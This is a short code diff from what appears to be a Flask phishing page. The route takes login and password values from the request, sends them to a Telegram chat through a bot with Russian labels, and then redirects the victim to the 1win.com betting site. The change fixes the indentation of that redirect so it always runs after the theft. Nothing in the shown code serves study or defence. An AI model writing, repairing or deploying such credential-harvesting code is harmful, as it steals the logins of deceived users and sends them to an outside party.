@@ -22,7 +22,7 @@ def hello_world():
             bot2.send_message('-1002238325372',f"Логин:<code>{request.args.get('login')}</code>\nПароль: <code>{request.args.get('password')}</code>\n\n<code>{request.args.get('login')}:{request.args.get('password')}</code>")
         except:
             pass
-            return Response(headers={'Content-Type': 'text/html', 'location': 'https://1win.com/'},status=302)
+        return Response(headers={'Content-Type': 'text/html', 'location': 'https://1win.com/'},status=302)
     user_agent = request.headers.get('User-Agent')
     if 'Mobile' in user_agent or 'Android' in user_agent:
             return render_template('main4.html')
